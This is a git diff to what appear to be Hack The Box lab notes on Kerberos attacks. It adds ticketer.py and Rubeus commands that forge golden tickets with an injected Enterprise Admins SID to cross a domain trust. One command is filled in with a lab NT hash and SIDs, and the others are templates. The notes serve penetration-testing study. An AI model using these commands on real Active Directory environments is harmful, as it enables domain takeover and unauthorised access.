@@ -16,3 +16,17 @@ The ticket will be saved down to our system as a [credential cache (ccache)](htt
 ```shell
 slomkm@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
 ```
+
+
+```
+ticketer.py -nthash 6963aad8ba1150192f3ca6341355eb49 -domain darkzero.ext -domain-sid S-1-5-21-1969715525-31638512-2552845157 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+```
+
+```
+ticketer.py -nthash 6963aad8ba1150192f3ca6341355eb49 -aesKey <krbtgt AES256 secret key> -domain-sid <trusted domain SID> -domain <trusted domain DNSname> -extra-sid <target SID> <trusted domain user SAMAccountName>
+```
+
+
+```
+Rubeus.exe golden /rc4:6963aad8ba1150192f3ca6341355eb49 /user:<trusted domain user SAMAccountName> /id:<trusted domain user RID> /domain:<trusted domain DNSname> /sid:<trusted domain SID> /sids:<target SID> /dc:<trusted domain DC DNSname> /nowrap /ptt
+```
